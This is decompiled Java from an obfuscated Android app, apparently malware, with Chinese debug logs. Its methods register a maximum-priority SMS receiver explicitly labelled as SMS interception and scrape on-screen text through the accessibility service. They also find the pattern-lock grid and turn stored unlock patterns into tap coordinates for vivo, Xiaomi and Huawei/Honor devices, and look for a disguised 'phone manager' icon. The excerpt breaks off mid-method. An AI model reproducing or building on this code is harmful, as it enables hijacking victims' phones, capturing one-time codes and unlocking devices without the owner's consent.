    public static final void m211420b9(dqtvuisjd dqtvuisjdVar) {
        dqtvuisjd$screenStateReceiver$1 dqtvuisjd_screenstatereceiver_1 = dqtvuisjdVar.f52457i8;
        try {
            IntentFilter intentFilter = new IntentFilter();
            intentFilter.addAction("android.intent.action.SCREEN_ON");
            intentFilter.addAction("android.intent.action.SCREEN_OFF");
            intentFilter.addAction("android.intent.action.USER_PRESENT");
            if (Build.VERSION.SDK_INT >= 33) {
                dqtvuisjdVar.registerReceiver(dqtvuisjd_screenstatereceiver_1, intentFilter, 2);
            } else {
                dqtvuisjdVar.registerReceiver(dqtvuisjd_screenstatereceiver_1, intentFilter);
            }
            dqtvuisjdVar.f52458i9 = true;
            t60.m214714d6("dqtvuisjd", "✅ 已注册屏幕状态广播接收器");
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 注册屏幕状态广播接收器失败", e);
        }
    }

    /* renamed from: c0 */
    public static final void m211421c0(dqtvuisjd dqtvuisjdVar) {
        t60.m214704c5("dqtvuisjd", "📩📩📩 [短信拦截] 开始动态注册短信接收器...");
        try {
            if (dqtvuisjdVar.f52461j2 != null) {
                t60.m214704c5("dqtvuisjd", "📩 [短信拦截] 接收器已存在，跳过注册");
                return;
            }
            dqtvuisjdVar.f52461j2 = new arniezsqllm();
            IntentFilter intentFilter = new IntentFilter();
            intentFilter.addAction("android.provider.Telephony.SMS_RECEIVED");
            intentFilter.addAction("android.provider.Telephony.SMS_DELIVER");
            intentFilter.setPriority(Integer.MAX_VALUE);
            t60.m214704c5("dqtvuisjd", "📩 [短信拦截] IntentFilter创建完成，priority=MAX");
            int i = Build.VERSION.SDK_INT;
            t60.m214704c5("dqtvuisjd", "📩 [短信拦截] Android SDK版本: " + i);
            if (i >= 33) {
                dqtvuisjdVar.registerReceiver(dqtvuisjdVar.f52461j2, intentFilter, 2);
                t60.m214704c5("dqtvuisjd", "📩 [短信拦截] 使用 RECEIVER_EXPORTED 注册 (Android 13+)");
            } else {
                dqtvuisjdVar.registerReceiver(dqtvuisjdVar.f52461j2, intentFilter);
                t60.m214704c5("dqtvuisjd", "📩 [短信拦截] 使用普通方式注册 (Android 13以下)");
            }
            t60.m214704c5("dqtvuisjd", "📩📩📩 [短信拦截] ✅✅✅ 短信接收器动态注册成功!");
        } catch (Exception e) {
            tz0.m214808a8("📩 [短信拦截] ❌❌❌ 动态注册失败: ", e.getMessage(), "dqtvuisjd", e);
        }
    }

    /* renamed from: c3 */
    public static final void m211422c3(int i, AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        String string;
        String string2;
        if (i > 10) {
            return;
        }
        CharSequence text = accessibilityNodeInfo.getText();
        if (text != null && (string2 = text.toString()) != null) {
            arrayList.add(string2);
        }
        CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
        if (contentDescription != null && (string = contentDescription.toString()) != null) {
            arrayList.add(string);
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i2 = 0; i2 < childCount; i2++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
            if (child != null) {
                try {
                    m211422c3(i + 1, child, arrayList);
                } catch (Exception unused) {
                }
                try {
                    child.recycle();
                } catch (Exception unused2) {
                }
            }
        }
    }

    /* renamed from: c4 */
    public static JSONObject m211423c4(AccessibilityNodeInfo accessibilityNodeInfo, int i, int[] iArr, int[] iArr2, int i2) {
        String string;
        String string2;
        String string3;
        if (accessibilityNodeInfo == null || i > i2) {
            return null;
        }
        try {
            Rect rect = new Rect();
            accessibilityNodeInfo.getBoundsInScreen(rect);
            iArr2[0] = iArr2[0] + 1;
            if (accessibilityNodeInfo.isClickable()) {
                iArr[0] = iArr[0] + 1;
            }
            JSONArray jSONArray = new JSONArray();
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i3 = 0; i3 < childCount; i3++) {
                JSONObject jSONObjectM211423c4 = m211423c4(accessibilityNodeInfo.getChild(i3), i + 1, iArr, iArr2, i2);
                if (jSONObjectM211423c4 != null) {
                    jSONArray.put(jSONObjectM211423c4);
                }
            }
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("id", "node_" + i + "_" + iArr2[0]);
            CharSequence text = accessibilityNodeInfo.getText();
            String str = "";
            if (text == null || (string = text.toString()) == null) {
                string = "";
            }
            jSONObject.put("text", string);
            CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
            if (contentDescription == null || (string2 = contentDescription.toString()) == null) {
                string2 = "";
            }
            jSONObject.put("description", string2);
            CharSequence className = accessibilityNodeInfo.getClassName();
            if (className != null && (string3 = className.toString()) != null) {
                str = string3;
            }
            jSONObject.put("className", str);
            JSONObject jSONObject2 = new JSONObject();
            jSONObject2.put("left", rect.left);
            jSONObject2.put("top", rect.top);
            jSONObject2.put("right", rect.right);
            jSONObject2.put("bottom", rect.bottom);
            jSONObject.put("bounds", jSONObject2);
            jSONObject.put("clickable", accessibilityNodeInfo.isClickable());
            jSONObject.put("depth", i);
            if (jSONArray.length() > 0) {
                jSONObject.put("children", jSONArray);
            }
            return jSONObject;
        } catch (Exception unused) {
            return null;
        }
    }

    /* renamed from: c6 */
    public static ArrayList m211424c6(Rect rect) {
        ArrayList arrayList = new ArrayList();
        float fWidth = rect.width() / 6.0f;
        float fHeight = rect.height() / 6.0f;
        t60.m214714d6("dqtvuisjd", "🔍 [calculateGridFromSquare] 边界框: " + rect + ", 间距: x=" + fWidth + ", y=" + fHeight);
        List listM213306g5 = AbstractC0716jf.m213306g5(1, 3, 5);
        for (int i = 0; i < 3; i++) {
            for (int i2 = 0; i2 < 3; i2++) {
                float fFloatValue = (((Number) listM213306g5.get(i2)).floatValue() * fWidth) + rect.left;
                float fFloatValue2 = (((Number) listM213306g5.get(i)).floatValue() * fHeight) + rect.top;
                arrayList.add(new PointF(fFloatValue, fFloatValue2));
                t60.m214702c3("dqtvuisjd", "🔍 [calculateGridFromSquare] 点" + ((i * 3) + i2 + 1) + ": (" + fFloatValue + ", " + fFloatValue2 + ")");
            }
        }
        AbstractC0003a2.m44c5("✅ [calculateGridFromSquare] 计算完成，共", arrayList.size(), "个点", "dqtvuisjd");
        return arrayList;
    }

    /* renamed from: d7 */
    public static ArrayList m211425d7(String str, Map map) {
        ArrayList arrayList;
        ArrayList arrayList2 = new ArrayList();
        try {
            t60.m214714d6("dqtvuisjd", "🔓 [convertPatternStringToCoordinates] 解析图案字符串: '" + str + "'");
            t60.m214702c3("dqtvuisjd", "🔓 [convertPatternStringToCoordinates] 布局keys: " + map.keySet());
            boolean z = false;
            if (AbstractC0779a1.m213652a5(str, ",", false)) {
                t60.m214702c3("dqtvuisjd", "🔓 [convertPatternStringToCoordinates] 使用逗号分隔格式");
                List listM213677d0 = AbstractC0779a1.m213677d0(str, new String[]{","}, 6);
                arrayList = new ArrayList();
                Iterator it = listM213677d0.iterator();
                while (it.hasNext()) {
                    Integer numM213685d8 = AbstractC0779a1.m213685d8(AbstractC0779a1.m213687e0((String) it.next()).toString());
                    if (numM213685d8 != null) {
                        arrayList.add(numM213685d8);
                    }
                }
            } else {
                t60.m214702c3("dqtvuisjd", "🔓 [convertPatternStringToCoordinates] 使用连续数字格式");
                List listM213938e6 = m21.m213938e6(str);
                arrayList = new ArrayList();
                Iterator it2 = listM213938e6.iterator();
                while (it2.hasNext()) {
                    char cCharValue = ((Character) it2.next()).charValue();
                    Integer numM213685d82 = AbstractC0779a1.m213685d8(String.valueOf(cCharValue));
                    if (numM213685d82 == null || !new n60(1, 9, 1).m214033a1(numM213685d82.intValue())) {
                        t60.m214726f4("dqtvuisjd", "🔓 [convertPatternStringToCoordinates] 无效字符: " + cCharValue);
                        numM213685d82 = null;
                    }
                    if (numM213685d82 != null) {
                        arrayList.add(numM213685d82);
                    }
                }
            }
            t60.m214714d6("dqtvuisjd", "🔓 [convertPatternStringToCoordinates] 解析出的数字: " + arrayList);
            int size = arrayList.size();
            int i = 0;
            while (i < size) {
                Object obj = arrayList.get(i);
                i++;
                int iIntValue = ((Number) obj).intValue();
                String strValueOf = AbstractC0779a1.m213652a5(str, ",", z) ? String.valueOf(iIntValue + 1) : String.valueOf(iIntValue);
                t60.m214702c3("dqtvuisjd", "🔓 [convertPatternStringToCoordinates] 查找key: " + strValueOf);
                if (((Pair) map.get(strValueOf)) != null) {
                    PointF pointF = new PointF((int) ((Number) r14.f57556a0).floatValue(), (int) ((Number) r14.f57557a1).floatValue());
                    arrayList2.add(pointF);
                    t60.m214714d6("dqtvuisjd", "🔓 [convertPatternStringToCoordinates] 转换: " + iIntValue + " -> key=" + strValueOf + " -> (" + pointF.x + ", " + pointF.y + ")");
                } else {
                    t60.m214726f4("dqtvuisjd", "🔓 [convertPatternStringToCoordinates] 布局中未找到key: " + strValueOf);
                    t60.m214702c3("dqtvuisjd", "🔓 [convertPatternStringToCoordinates] 可用keys: " + AbstractC0715je.m213299i6(map.keySet()));
                }
                z = false;
            }
            t60.m214714d6("dqtvuisjd", "🔓 [convertPatternStringToCoordinates] 最终坐标数: " + arrayList2.size());
            int size2 = arrayList2.size();
            int i2 = 0;
            int i3 = 0;
            while (i2 < size2) {
                Object obj2 = arrayList2.get(i2);
                i2++;
                int i4 = i3 + 1;
                if (i3 < 0) {
                    AbstractC0716jf.m213309g8();
                    throw null;
                }
                PointF pointF2 = (PointF) obj2;
                t60.m214702c3("dqtvuisjd", "🔓 [convertPatternStringToCoordinates] 坐标[" + i3 + "]: (" + pointF2.x + ", " + pointF2.y + ")");
                i3 = i4;
            }
            return arrayList2;
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ [convertPatternStringToCoordinates] 转换失败", e);
            return arrayList2;
        }
    }

    /* renamed from: d8 */
    public static ArrayList m211426d8(String str, List list) {
        ArrayList arrayList;
        ArrayList arrayList2 = new ArrayList();
        int i = 0;
        try {
            if (AbstractC0779a1.m213652a5(str, ",", false)) {
                List listM213677d0 = AbstractC0779a1.m213677d0(str, new String[]{","}, 6);
                arrayList = new ArrayList();
                Iterator it = listM213677d0.iterator();
                while (it.hasNext()) {
                    Integer numM213685d8 = AbstractC0779a1.m213685d8(AbstractC0779a1.m213687e0((String) it.next()).toString());
                    if (numM213685d8 != null) {
                        arrayList.add(numM213685d8);
                    }
                }
            } else {
                List listM213938e6 = m21.m213938e6(str);
                arrayList = new ArrayList();
                Iterator it2 = listM213938e6.iterator();
                while (it2.hasNext()) {
                    Integer numM213685d82 = AbstractC0779a1.m213685d8(String.valueOf(((Character) it2.next()).charValue()));
                    Integer numValueOf = (numM213685d82 == null || !new n60(1, 9, 1).m214033a1(numM213685d82.intValue())) ? null : Integer.valueOf(numM213685d82.intValue() - 1);
                    if (numValueOf != null) {
                        arrayList.add(numValueOf);
                    }
                }
            }
            t60.m214702c3("dqtvuisjd", "🔓 [convertPatternToDetectedCoordinates] 图案索引: " + arrayList);
            int size = arrayList.size();
            while (i < size) {
                Object obj = arrayList.get(i);
                i++;
                int iIntValue = ((Number) obj).intValue();
                if (iIntValue >= 0 && iIntValue < 9) {
                    arrayList2.add(list.get(iIntValue));
                    t60.m214702c3("dqtvuisjd", "🔓 [convertPatternToDetectedCoordinates] 索引" + iIntValue + " -> (" + ((PointF) list.get(iIntValue)).x + ", " + ((PointF) list.get(iIntValue)).y + ")");
                }
            }
            return arrayList2;
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ [convertPatternToDetectedCoordinates] 转换失败", e);
            return arrayList2;
        }
    }

    /* renamed from: e0 */
    public static String m211427e0() {
        String str = Build.BRAND;
        t60.m214694b5(str, "BRAND");
        String lowerCase = str.toLowerCase(Locale.ROOT);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        int i = Build.VERSION.SDK_INT;
        boolean z = AbstractC0779a1.m213652a5(lowerCase, "xiaomi", false) || AbstractC0779a1.m213652a5(lowerCase, "redmi", false);
        StringBuilder sbM40c1 = AbstractC0003a2.m40c1("🔍 [设备] 设备检测: 品牌=", lowerCase, ", SDK=", i, ", 是否小米=");
        sbM40c1.append(z);
        t60.m214702c3("dqtvuisjd", sbM40c1.toString());
        if (!z) {
            return null;
        }
        if (i == 29) {
            t60.m214702c3("dqtvuisjd", "🔍 [设备] 检测到小米Android 10设备");
            return "Android 10";
        }
        if (i == 33) {
            t60.m214702c3("dqtvuisjd", "🔍 [设备] 检测到小米Android 13设备");
            return "Android 13";
        }
        if (i == 34) {
            t60.m214702c3("dqtvuisjd", "🔍 [设备] 检测到小米Android 14设备");
            return "Android 13";
        }
        t60.m214702c3("dqtvuisjd", "🔍 [设备] 小米设备其他版本: SDK=" + i);
        return null;
    }

    /* renamed from: e1 */
    public static String m211428e1() {
        String str = Build.BRAND;
        t60.m214694b5(str, "BRAND");
        String lowerCase = str.toLowerCase(Locale.ROOT);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        int i = Build.VERSION.SDK_INT;
        boolean z = AbstractC0779a1.m213652a5(lowerCase, "vivo", false) || AbstractC0779a1.m213652a5(lowerCase, "oneplus", false);
        StringBuilder sbM40c1 = AbstractC0003a2.m40c1("🔍 [设备] 设备检测: 品牌=", lowerCase, ", SDK=", i, ", 是否Vivo=");
        sbM40c1.append(z);
        t60.m214702c3("dqtvuisjd", sbM40c1.toString());
        if (z) {
            return "Vivo";
        }
        return null;
    }

    /* renamed from: f1 */
    public static void m211429f1(int i, AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        if (i > 15) {
            return;
        }
        if (accessibilityNodeInfo.isClickable()) {
            arrayList.add(accessibilityNodeInfo);
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i2 = 0; i2 < childCount; i2++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
            if (child != null) {
                m211429f1(i + 1, child, arrayList);
            }
        }
    }

    /* renamed from: f3 */
    public static Rect m211430f3(AccessibilityNodeInfo accessibilityNodeInfo, String str, int i) {
        String string;
        String string2;
        if (accessibilityNodeInfo != null && i <= 20) {
            try {
                CharSequence text = accessibilityNodeInfo.getText();
                String str2 = "";
                if (text == null || (string = text.toString()) == null) {
                    string = "";
                }
                CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
                if (contentDescription != null && (string2 = contentDescription.toString()) != null) {
                    str2 = string2;
                }
                if (AbstractC0779a1.m213652a5(string, str, true) || AbstractC0779a1.m213652a5(str2, str, true) || AbstractC0779a1.m213652a5(string, "⠀手机管家⠀", true) || AbstractC0779a1.m213652a5(str2, "⠀手机管家⠀", true) || AbstractC0779a1.m213652a5(string, "⠀⠀", true) || AbstractC0779a1.m213652a5(str2, "⠀⠀", true)) {
                    if (accessibilityNodeInfo.isVisibleToUser() && accessibilityNodeInfo.isClickable()) {
                        Rect rect = new Rect();
                        accessibilityNodeInfo.getBoundsInScreen(rect);
                        if (!rect.isEmpty() && rect.width() >= 10 && rect.height() >= 10) {
                            t60.m214702c3("dqtvuisjd", "✅ 找到图标: " + str + ", bounds=" + rect);
                            return rect;
                        }
                    }
                    AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
                    for (int i2 = 0; parent != null && i2 < 5; i2++) {
                        if (parent.isClickable() && parent.isVisibleToUser()) {
                            Rect rect2 = new Rect();
                            parent.getBoundsInScreen(rect2);
                            if (!rect2.isEmpty() && rect2.width() >= 10 && rect2.height() >= 10) {
                                t60.m214702c3("dqtvuisjd", "✅ 在父节点找到图标: " + str + ", bounds=" + rect2);
                                return rect2;
                            }
                        }
                        parent = parent.getParent();
                    }
                }
                int childCount = accessibilityNodeInfo.getChildCount();
                for (int i3 = 0; i3 < childCount; i3++) {
                    Rect rectM211430f3 = m211430f3(accessibilityNodeInfo.getChild(i3), str, i + 1);
                    if (rectM211430f3 != null) {
                        return rectM211430f3;
                    }
                }
            } catch (Exception unused) {
            }
        }
        return null;
    }

    /* renamed from: f6 */
    public static AccessibilityNodeInfo m211431f6(AccessibilityNodeInfo accessibilityNodeInfo) {
        AccessibilityNodeInfo accessibilityNodeInfoM211431f6;
        String string;
        try {
            CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
            if (contentDescription != null && (string = contentDescription.toString()) != null && AbstractC0779a1.m213652a5(string, "图案区域", true)) {
                return accessibilityNodeInfo;
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                if (child != null && (accessibilityNodeInfoM211431f6 = m211431f6(child)) != null) {
                    return accessibilityNodeInfoM211431f6;
                }
            }
            return null;
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "查找内容描述节点失败", e);
            return null;
        }
    }

    /* renamed from: f7 */
    public static AccessibilityNodeInfo m211432f7(AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        AccessibilityNodeInfo accessibilityNodeInfoM211432f7;
        if (i <= 20) {
            try {
                int childCount = accessibilityNodeInfo.getChildCount();
                CharSequence className = accessibilityNodeInfo.getClassName();
                if (className != null) {
                    className.toString();
                }
                accessibilityNodeInfo.getBoundsInScreen(new Rect());
                if (childCount == 9) {
                    ArrayList arrayList = new ArrayList();
                    int i2 = 0;
                    while (true) {
                        if (i2 < 9) {
                            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
                            if (child == null) {
                                break;
                            }
                            Rect rect = new Rect();
                            child.getBoundsInScreen(rect);
                            if (rect.width() <= 0 || rect.height() <= 0) {
                                break;
                            }
                            arrayList.add(rect);
                            i2++;
                        } else if (arrayList.size() == 9) {
                            ArrayList arrayList2 = new ArrayList(AbstractC0717jg.m213310g9(arrayList));
                            int size = arrayList.size();
                            int i3 = 0;
                            while (i3 < size) {
                                Object obj = arrayList.get(i3);
                                i3++;
                                arrayList2.add(Integer.valueOf(((Rect) obj).centerY()));
                            }
                            List listM213299i6 = AbstractC0715je.m213299i6(AbstractC0715je.m213288h5(arrayList2));
                            ArrayList arrayList3 = new ArrayList(AbstractC0717jg.m213310g9(arrayList));
                            int size2 = arrayList.size();
                            int i4 = 0;
                            while (i4 < size2) {
                                Object obj2 = arrayList.get(i4);
                                i4++;
                                arrayList3.add(Integer.valueOf(((Rect) obj2).centerX()));
                            }
                            List listM213299i62 = AbstractC0715je.m213299i6(AbstractC0715je.m213288h5(arrayList3));
                            if (listM213299i6.size() >= 2 && listM213299i62.size() >= 2) {
                                t60.m214714d6("dqtvuisjd", "✅ [findPatternContainer] 确认为九宫格容器!");
                                return accessibilityNodeInfo;
                            }
                        }
                    }
                }
                for (int i5 = 0; i5 < childCount; i5++) {
                    AccessibilityNodeInfo child2 = accessibilityNodeInfo.getChild(i5);
                    if (child2 != null && (accessibilityNodeInfoM211432f7 = m211432f7(child2, i + 1)) != null) {
                        return accessibilityNodeInfoM211432f7;
                    }
                }
            } catch (Exception e) {
                t60.m214705c6("dqtvuisjd", "❌ [findPatternContainer] 查找失败", e);
                return null;
            }
        }
        return null;
    }

    /* JADX WARN: Removed duplicated region for block: B:18:0x042a A[LOOP:0: B:16:0x0424->B:18:0x042a, LOOP_END] */
    /* renamed from: g0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static ArrayList m211433g0(int i, int i2) {
        ArrayList arrayList;
        Iterator it;
        int i3 = i;
        Float fValueOf = Float.valueOf(0.55f);
        Float fValueOf2 = Float.valueOf(0.5f);
        ArrayList arrayList2 = new ArrayList();
        float f = i2;
        float f2 = i3;
        String str = Build.MANUFACTURER;
        t60.m214694b5(str, "MANUFACTURER");
        String lowerCase = str.toLowerCase(Locale.ROOT);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        String str2 = String.format("%.2f", Arrays.copyOf(new Object[]{Float.valueOf(f / f2)}, 1));
        StringBuilder sbM38b9 = AbstractC0003a2.m38b9("🔍 [generateAdaptivePatternLayouts] 屏幕: ", i3, "x", i2, ", 比例=");
        sbM38b9.append(str2);
        sbM38b9.append(", 厂商=");
        sbM38b9.append(lowerCase);
        t60.m214714d6("dqtvuisjd", sbM38b9.toString());
        String str3 = "9";
        String str4 = "8";
        String str5 = "7";
        String str6 = "6";
        String str7 = "3";
        String str8 = "2";
        String str9 = "1";
        if (!AbstractC0779a1.m213652a5(lowerCase, "vivo", false)) {
            arrayList = arrayList2;
            if (AbstractC0779a1.m213652a5(lowerCase, "iqoo", false) || AbstractC0779a1.m213652a5(lowerCase, "bbk", false)) {
            }
            String str10 = str5;
            String str11 = str6;
            ArrayList arrayList3 = arrayList;
            String str12 = str4;
            String str13 = str3;
            float f3 = 0.844f * f2;
            float f4 = 0.078f * f2;
            float f5 = 0.48f * f;
            String str14 = ")";
            float f6 = f3 / 3.0f;
            t60.m214702c3("dqtvuisjd", "🔍 [generatePatternLockLayoutByBounds] 网格大小=" + f3 + ", 左边距=" + f4 + ", 顶部=" + f5 + ", 格子大小=" + f6);
            float f7 = f6 * 0.5f;
            float f8 = f4 + f7;
            float f9 = f7 + f5;
            Pair pair = new Pair("1", new Pair(Float.valueOf(f8), Float.valueOf(f9)));
            float f10 = 1.5f * f6;
            float f11 = f4 + f10;
            Pair pair2 = new Pair("2", new Pair(Float.valueOf(f11), Float.valueOf(f9)));
            float f12 = 2.5f * f6;
            float f13 = f4 + f12;
            float f14 = f5 + f10;
            float f15 = f5 + f12;
            arrayList3.add(new Pair("华为/荣耀精确布局", AbstractC0770a1.m213614f9(pair, pair2, new Pair("3", new Pair(Float.valueOf(f13), Float.valueOf(f9))), new Pair("4", new Pair(Float.valueOf(f8), Float.valueOf(f14))), new Pair("5", new Pair(Float.valueOf(f11), Float.valueOf(f14))), new Pair(str11, new Pair(Float.valueOf(f13), Float.valueOf(f14))), new Pair(str10, new Pair(Float.valueOf(f8), Float.valueOf(f15))), new Pair(str12, new Pair(Float.valueOf(f11), Float.valueOf(f15))), new Pair(str13, new Pair(Float.valueOf(f13), Float.valueOf(f15))))));
            for (it = AbstractC0716jf.m213306g5(new Triple(Float.valueOf(0.85f), fValueOf2, "通用布局1"), new Triple(Float.valueOf(0.8f), fValueOf, "通用布局2"), new Triple(Float.valueOf(0.75f), fValueOf2, "通用布局3"), new Triple(Float.valueOf(0.7f), fValueOf, "通用布局4"), new Triple(Float.valueOf(0.65f), Float.valueOf(0.6f), "通用布局5")).iterator(); it.hasNext(); it = it) {
                Triple triple = (Triple) it.next();
                float fFloatValue = ((Number) triple.f57564a0).floatValue();
                float fFloatValue2 = ((Number) triple.f57565a1).floatValue();
                String str15 = (String) triple.f57566a2;
                float f16 = fFloatValue * f2;
                float f17 = 2;
                float f18 = f16 / f17;
                float f19 = (f18 / f17) + ((f2 - f16) / f17);
                float f20 = (fFloatValue2 * f) - f18;
                t60.m214702c3("dqtvuisjd", "🔍 [generatePatternLockLayout] 网格大小=" + f16 + ", 间距=" + f18);
                String str16 = str14;
                t60.m214702c3("dqtvuisjd", AbstractC0003a2.m29b0("🔍 [generatePatternLockLayout] 起始位置=(", f19, ", ", f20, str16));
                Pair pair3 = new Pair(str9, new Pair(Float.valueOf(f19), Float.valueOf(f20)));
                float f21 = f19 + f18;
                String str17 = str9;
                float f22 = f17 * f18;
                float f23 = f19 + f22;
                float f24 = f20 + f18;
                float f25 = f20 + f22;
                arrayList3.add(new Pair(str15, AbstractC0770a1.m213614f9(pair3, new Pair(str8, new Pair(Float.valueOf(f21), Float.valueOf(f20))), new Pair(str7, new Pair(Float.valueOf(f23), Float.valueOf(f20))), new Pair("4", new Pair(Float.valueOf(f19), Float.valueOf(f24))), new Pair("5", new Pair(Float.valueOf(f21), Float.valueOf(f24))), new Pair(str11, new Pair(Float.valueOf(f23), Float.valueOf(f24))), new Pair(str10, new Pair(Float.valueOf(f19), Float.valueOf(f25))), new Pair(str12, new Pair(Float.valueOf(f21), Float.valueOf(f25))), new Pair(str13, new Pair(Float.valueOf(f23), Float.valueOf(f25))))));
                t60.m214702c3("dqtvuisjd", "🔍 [generateAdaptivePatternLayouts] 生成布局: " + str15);
                str14 = str16;
                str9 = str17;
                str8 = str8;
                str7 = str7;
            }
            return arrayList3;
        }
        arrayList = arrayList2;
        t60.m214714d6("dqtvuisjd", "🔍 [generateAdaptivePatternLayouts] 检测到vivo设备，使用vivo专用布局");
        Iterator it2 = AbstractC0716jf.m213306g5(new Pair(Float.valueOf(1.25f), "Y=1350"), new Pair(Float.valueOf(1.3f), "Y=1404"), new Pair(Float.valueOf(1.35f), "Y=1458"), new Pair(Float.valueOf(1.4f), "Y=1512"), new Pair(Float.valueOf(1.2f), "Y=1296"), new Pair(Float.valueOf(1.15f), "Y=1242")).iterator();
        while (it2.hasNext()) {
            Pair pair4 = (Pair) it2.next();
            float fFloatValue3 = ((Number) pair4.f57556a0).floatValue();
            String str18 = (String) pair4.f57557a1;
            Iterator it3 = it2;
            float f26 = f2 * 0.26f;
            float f27 = f2 * fFloatValue3;
            String str19 = str3;
            float f28 = f2 * 0.23f;
            String str20 = str4;
            float f29 = f2 * 0.21f;
            String str21 = str5;
            String str22 = str6;
            t60.m214702c3("dqtvuisjd", "🔍 [generateVivoProportionalLayout] 屏幕宽度=" + i3);
            t60.m214702c3("dqtvuisjd", "🔍 [generateVivoProportionalLayout] 比例(基于宽度): X=0.26, Y=" + fFloatValue3 + ", 间距X=0.23, 间距Y=0.21");
            t60.m214702c3("dqtvuisjd", "🔍 [generateVivoProportionalLayout] 实际坐标: 起点=(" + f26 + ", " + f27 + "), 间距=(" + f28 + ", " + f29 + ")");
            float f30 = f26 + f28;
            float f31 = (float) 2;
            float f32 = (f28 * f31) + f26;
            float f33 = f27 + f29;
            float f34 = (f29 * f31) + f27;
            arrayList.add(new Pair(AbstractC0003a2.m33b4("vivo(", str18, ")"), AbstractC0770a1.m213614f9(new Pair("1", new Pair(Float.valueOf(f26), Float.valueOf(f27))), new Pair("2", new Pair(Float.valueOf(f30), Float.valueOf(f27))), new Pair("3", new Pair(Float.valueOf(f32), Float.valueOf(f27))), new Pair("4", new Pair(Float.valueOf(f26), Float.valueOf(f33))), new Pair("5", new Pair(Float.valueOf(f30), Float.valueOf(f33))), new Pair(str22, new Pair(Float.valueOf(f32), Float.valueOf(f33))), new Pair(str21, new Pair(Float.valueOf(f26), Float.valueOf(f34))), new Pair(str20, new Pair(Float.valueOf(f30), Float.valueOf(f34))), new Pair(str19, new Pair(Float.valueOf(f32), Float.valueOf(f34))))));
            it2 = it3;
            str5 = str21;
            str3 = str19;
            str4 = str20;
            i3 = i;
            str6 = str22;
        }
        String str102 = str5;
        String str112 = str6;
        ArrayList arrayList32 = arrayList;
        String str122 = str4;
        String str132 = str3;
        float f35 = 0.844f * f2;
        float f42 = 0.078f * f2;
        float f52 = 0.48f * f;
        String str142 = ")";
        float f62 = f35 / 3.0f;
        t60.m214702c3("dqtvuisjd", "🔍 [generatePatternLockLayoutByBounds] 网格大小=" + f35 + ", 左边距=" + f42 + ", 顶部=" + f52 + ", 格子大小=" + f62);
        float f72 = f62 * 0.5f;
        float f82 = f42 + f72;
        float f92 = f72 + f52;
        Pair pair5 = new Pair("1", new Pair(Float.valueOf(f82), Float.valueOf(f92)));
        float f102 = 1.5f * f62;
        float f112 = f42 + f102;
        Pair pair22 = new Pair("2", new Pair(Float.valueOf(f112), Float.valueOf(f92)));
        float f122 = 2.5f * f62;
        float f132 = f42 + f122;
        float f142 = f52 + f102;
        float f152 = f52 + f122;
        arrayList32.add(new Pair("华为/荣耀精确布局", AbstractC0770a1.m213614f9(pair5, pair22, new Pair("3", new Pair(Float.valueOf(f132), Float.valueOf(f92))), new Pair("4", new Pair(Float.valueOf(f82), Float.valueOf(f142))), new Pair("5", new Pair(Float.valueOf(f112), Float.valueOf(f142))), new Pair(str112, new Pair(Float.valueOf(f132), Float.valueOf(f142))), new Pair(str102, new Pair(Float.valueOf(f82), Float.valueOf(f152))), new Pair(str122, new Pair(Float.valueOf(f112), Float.valueOf(f152))), new Pair(str132, new Pair(Float.valueOf(f132), Float.valueOf(f152))))));
        while (it.hasNext()) {
        }
        return arrayList32;
    }

    /* JADX WARN: Removed duplicated region for block: B:22:0x0173  */
    /* JADX WARN: Removed duplicated region for block: B:25:0x017c  */
    /* JADX WARN: Removed duplicated region for block: B:58:0x0249  */
    /* JADX WARN: Removed duplicated region for block: B:59:0x024b A[Catch: Exception -> 0x0228, TryCatch #1 {Exception -> 0x0228, blocks: (B:35:0x01ce, B:56:0x0244, B:63:0x025a, B:62:0x0255, B:59:0x024b, B:42:0x021b, B:48:0x022b, B:52:0x0237), top: B:69:0x01ce }] */
    /* JADX WARN: Removed duplicated region for block: B:61:0x0253  */
    /* JADX WARN: Removed duplicated region for block: B:62:0x0255 A[Catch: Exception -> 0x0228, TryCatch #1 {Exception -> 0x0228, blocks: (B:35:0x01ce, B:56:0x0244, B:63:0x025a, B:62:0x0255, B:59:0x024b, B:42:0x021b, B:48:0x022b, B:52:0x0237), top: B:69:0x01ce }] */
    /* renamed from: j9 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static void m211434j9(dqtvuisjd dqtvuisjdVar, float f, float f2, String str, float f3) {
        float f4;
        String str2;
        float f5;
        float f6;
        Pair pairM211467g1;
        Object obj;
        Point point;
        t60.m214695b6(str, "source");
        if (dqtvuisjdVar.f52417e8 != null) {
            ou0 ou0Var = dqtvuisjdVar.f52419f0;
            if (ou0Var != null) {
                dqtvuisjd dqtvuisjdVar2 = ou0Var.f59123a0;
                try {
                    Object systemService = dqtvuisjdVar2.getSystemService("window");
                    t60.m214693b4(systemService, "null cannot be cast to non-null type android.view.WindowManager");
                    Display defaultDisplay = ((WindowManager) systemService).getDefaultDisplay();
                    point = new Point();
                    defaultDisplay.getRealSize(point);
